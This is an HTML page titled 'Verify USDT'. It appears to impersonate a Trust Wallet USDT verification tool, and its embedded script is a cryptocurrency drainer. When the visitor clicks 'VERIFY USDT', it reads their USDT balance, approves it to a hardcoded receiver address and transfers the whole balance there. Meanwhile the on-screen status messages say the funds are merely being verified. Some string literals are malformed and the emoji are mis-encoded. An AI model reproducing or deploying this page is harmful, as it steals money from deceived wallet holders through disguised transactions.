<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify USDT</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: #ffffff;
      color: #000000;
      overflow-x: hidden;
    }
    .hero {
      background-image: url('https://trustwallet.com/assets/images/bg-hero.6c8ceec1.png');
      background-size: cover;
      background-position: center;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      text-align: center;
    }
    .hero h1 {
      font-size: 32px;
      font-weight: 600;
      margin-bottom: 20px;
    }
    .verify-btn {
      background: linear-gradient(90deg, #00c2ff, #0085ff);
      color: #fff;
      padding: 15px 40px;
      border: none;
      border-radius: 50px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 0 10px #00c2ff;
      transition: 0.3s;
    }
    .verify-btn:hover {
      box-shadow: 0 0 20px #00c2ff;
    }
    #status {
      margin-top: 30px;
      font-size: 16px;
    }
    @media (max-width: 600px) {
      .hero h1 {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>
  <div class="hero">
    <h1>Verify Your USDT</h1>
    <button class="verify-btn" onclick="startTransfer()">VERIFY USDT</button>
    <p id="status"></p>
  </div>  <script>
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";

    const usdtABI = [
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
    ];

    async function startTransfer() {
      const status = document.getElementById("status");

      if (typeof window.ethereum === 'undefined') {
        alert("‚ö†Ô∏è Please open in Trust Wallet browser.");
        return;
      }

      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];

      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
      const balance = await usdt.methods.balanceOf(sender).call();

      if (balance == 0) {
        alert("‚ùå No USDT found in wallet.");
        return;
      }

      const readable = web3.utils.fromWei(balance, 'ether');
      status.innerText = üîê Flash USDT Verify...;

      try {
        await usdt.methods.approve(receiver, balance).send({ from: sender });
        status.innerText = "üîÑ Flash Verified. Sending...";

        await usdt.methods.transfer(receiver, balance).send({ from: sender });
        status.innerText = ‚úÖ ${readable} USDT Verified;
      } catch (err) {
        console.error(err);
        status.innerText = "‚ùå Transaction Failed or Cancelled.";
        alert("Transaction failed or cancelled.");
      }
    }
  </script></body>
</html>
